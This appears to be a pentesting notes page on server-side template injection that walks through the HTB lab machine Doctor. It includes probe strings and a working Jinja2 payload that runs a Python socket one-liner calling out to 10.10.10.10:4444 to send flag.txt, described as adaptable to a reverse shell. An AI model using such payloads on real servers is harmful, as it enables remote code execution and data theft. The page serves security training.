---
description: '{{7*7}}'
---

# Server-Side Template Injection

SSTI exploits Template Engines, like node.js, Flask, Twig used in web applications. These engines are used by web apps to present dynamic data via web pages and emails. However, template injection occurs when the user input is embedded in a template in an unsafe manner.

## How it Works

Template injection works because websites fail to take in the data as just text, but rather process it and directly use it as part of a template, thus allowing attackers to inject template directives to manipulate the template engine used. This often leads to RCE.

To test for this, we can follow this flowchart:

<figure><img src="../.gitbook/assets/image (2580).png" alt=""><figcaption></figcaption></figure>

A successful injection would result in '49' being output, showing that the website does indeed process the template injected and confirming that we have RCE.

## Example

The HTB machine Doctor has a good SSTI vulnerability within it.

The machine has a secret page that allows for posts by the user to be made with a **title** and **content.** We do not know the template engine being used yet.&#x20;

<figure><img src="../.gitbook/assets/image (1798).png" alt=""><figcaption></figcaption></figure>

We can straightaway begin testing for SSTI via this. After using `{{7*7}}`, we would see the following:

<figure><img src="../.gitbook/assets/image (718).png" alt=""><figcaption></figcaption></figure>

The 49 present indicates that it worked, and that the other payload was not processed. Further testing with `{{7*'7'}}`would dispaly this:

<figure><img src="../.gitbook/assets/image (3164).png" alt=""><figcaption></figcaption></figure>

From here, based on the flowchart, we would know that the website is running on either Jinja2 or Twig. We can then grab a payload for potential RCE using PayloadAllTheThings:

```python
{% raw %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.10.10\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
{% endraw %}
```

Editing the payload to give us a reverse shell would work on this machine.&#x20;

SSTI is rather easy to exploit once found. Here are some other payloads that we can use:

```
${}
${7/0}
{{}}
{{7*7}}
<%= %>
<%= 7*7 %>
``
```

Once the template has been identified, attempt exploitation via the relevant payload.

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection" %}
